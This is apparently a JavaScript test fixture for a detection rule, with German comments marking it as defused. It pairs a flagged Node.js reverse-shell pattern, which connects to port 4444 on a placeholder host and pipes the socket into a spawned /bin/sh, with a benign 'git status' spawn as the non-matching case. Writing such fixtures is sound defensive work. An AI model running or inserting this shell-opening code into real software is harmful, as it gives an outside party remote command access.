// LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
const net = require("net");
const { spawn } = require("child_process");
const client = new net.Socket();
client.connect(4444, "gegenstelle.invalid", () => {
  const sh = spawn("/bin/sh", []);
  // ruleid: LB-C10-schadmuster-js
  client.pipe(sh.stdin);
});
const proc = spawn("git", ["status"]);
// ok: LB-C10-schadmuster-js
proc.stdout.pipe(process.stdout);
